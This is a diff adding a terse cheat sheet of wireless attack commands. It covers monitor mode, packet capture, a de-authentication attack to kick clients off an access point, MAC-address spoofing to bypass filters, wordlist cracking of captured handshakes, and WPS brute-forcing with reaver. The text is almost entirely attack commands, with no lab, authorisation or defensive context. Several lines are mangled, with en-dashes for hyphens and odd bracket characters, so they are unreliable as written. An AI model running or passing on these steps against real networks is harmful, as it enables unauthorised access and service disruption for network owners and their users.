@@ -1,0 +1,23 @@
+Turning on the monitor mode
+    **$ airmon-ng start wlan0**
+    We can not see packages from SSIDs that we are not associated with
+
+Monitoring
+    We capture packages running:
+    **$ airodump-ng mon0**
+
+Speeding up
+    We can launch a de-authentication attack to speed up the process:
+    **$ aireplay-ng -0 3 –a <macaddress of the ap> mon0**
+
+Capturing packages
+    **$ airodump-ng mon0 --bssid –c (channel) –w (file name to save)**
+
+Bypass MAC filter
+    **$ macchanger –m B0:D0:9C:5C:EF:86 wlan0**
+
+Cracking the cap
+    **$ aircrack-ng RHAWEP-0.1-cap -w /wordlist**
+
+Cracking WPS
+    **$ reaver –i mon0 –b ≤bssid≥ –d 0**
